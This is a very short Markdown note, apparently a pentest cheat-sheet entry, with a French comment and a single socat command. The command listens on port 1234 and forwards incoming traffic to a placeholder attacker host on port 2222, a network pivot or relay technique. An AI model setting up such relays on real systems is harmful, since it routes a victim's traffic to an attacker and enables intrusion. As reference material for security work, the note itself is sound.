---
public: true # set to true to make the article publishable
---

```
# ecoute sur le port 1234 et redirige le trafic entrant vers <ATTACKER IP> port 2222
socat TCP4-LISTEN:1234,fork TCP4:<ATTACKER IP>:2222
```
